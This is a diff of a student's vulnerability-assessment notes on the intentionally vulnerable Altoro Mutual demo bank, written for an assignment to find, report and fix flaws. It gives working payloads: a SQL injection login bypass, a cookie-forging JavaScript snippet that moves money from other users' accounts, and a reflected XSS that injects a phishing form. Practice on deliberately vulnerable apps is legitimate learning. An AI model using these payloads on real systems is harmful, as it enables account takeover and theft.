@@ -1,32 +1,3 @@
-TODO
-  - Repeat SQL injection
-  - Repeat input validation
-  - Repeat broken access control
-  - Test admin account vulnerabilities
-    - Try to XSS an admin?
-
-Requirements:
-- install and use project demo.testfire.net (available on github)
-- find 18 vulnerabilities and create report about them
-- fix the vulnerabilities and create test report (containing proof that vulnerability is fixed)
-
-Report content:
-- table containing names of the 18 vulnerabilities and their severity
-- table containing each vulnerability explained in detail in the form of (name, description, explanation and replication steps, impact, severity)
-- table containing the vulnerability and if it was fixed or not and the re-testing steps
-
-- Need to find 18 vulnerabilities
-  - Table containing names (vulnerabilities overview)
-  - Table containing name, description, explanation (endpoint, body, steps), impact, severity (vulnerabilities report)
-  - Table containing name, reason in code, fix, re-test steps? (fixing report)
-
-- TODO
-  - Write draft vulnerabilities report
-  - Write vulnerabilities report formally with easy to reproduce steps
-  - Fix and write draft fixing report
-  - Write fixing report formally
-  - Write vulnerabilities overview with links
-
 - SQL injection
   - while logging in, provide
     - username: asd' or 1=1 --
@@ -218,6 +189,23 @@ Report content:
   - Cause: OperationsUtil.doApiTransfer does not do business logic checks before calling DBUtil.transferFunds
   - Impact: a user can transfer money from an arbitrary account to his own
 
+- Broken access control (blindly trusting cookies)
+  - Go to altoromutual/bank/transfer.jsp
+    - Run the following JavaScript script
+        evilCookie = btoa('800000~evil~101|800004~Savings~101');
+        document.cookie = `AltoroAccounts=${evilCookie}`;
+        opt = document.createElement('option');
+        opt.value = "800000";
+        opt.innerHTML = "800000 victim";
+        fromAccount.appendChild(opt);
+    - Choose "800000 victim" from the "from" dropdown list (notice that it does not belong to Jane Doe)
+    - Choose one of your accounts from the "to" dropdown list
+    - Enter an amount of money, click "Transfer money" and notice the money get transferred from the victim's account
+      to yours
+  - Cause: OperationsUtil.doServletTransfer() checks for a cookie called AltoroAccounts, and if it exists, it uses it
+    to determine the user's accounts. This cookie can be modified on the client side
+  - Impact: a user can transfer funds from any account of any other user to their account
+
 - Broken access control
   - User the following javascript, and observe how you can fetch account details of another user:
       username = 'jdoe';
@@ -280,23 +268,6 @@ Report content:
   - Go to /altoromutual/admin/admin.jsp and observe how the user can access admin pages
   - Cause: AdminFilter is given on the wrong url (/adimn/* instead of /admin/*)
   - Impact: a user can take privileged actions as an administrator
-
-- Broken access control (blindly trusting cookies)
-  - Go to altoromutual/bank/transfer.jsp
-    - Run the following JavaScript script
-        evilCookie = btoa('800000~evil~101|800004~Savings~101');
-        document.cookie = `AltoroAccounts=${evilCookie}`;
-        opt = document.createElement('option');
-        opt.value = "800000";
-        opt.innerHTML = "800000 victim";
-        fromAccount.appendChild(opt);
-    - Choose "800000 victim" from the "from" dropdown list (notice that it does not belong to Jane Doe)
-    - Choose one of your accounts from the "to" dropdown list
-    - Enter an amount of money, click "Transfer money" and notice the money get transferred from the victim's account
-      to yours
-  - Cause: OperationsUtil.doServletTransfer() checks for a cookie called AltoroAccounts, and if it exists, it uses it
-    to determine the user's accounts. This cookie can be modified on the client side
-  - Impact: a user can transfer funds from any account of any other user to their account
 
 - Cross site scripting
   - Go to /altoromutual/bank/customize.jsp?lang=%3Cbr%3E%3Cform%3E%3Clabel%3Eevil%20username%3C/label%3E%3Cinput%20type=%27text%27%3E%3Cbr%3E%3Clabel%3Eevil%20password%3C/label%3E%3Cinput%20type=%27password%27%3E%3Cinput%20type=%27submit%27%3E%3C/form%3E and observe how an evil form was injected
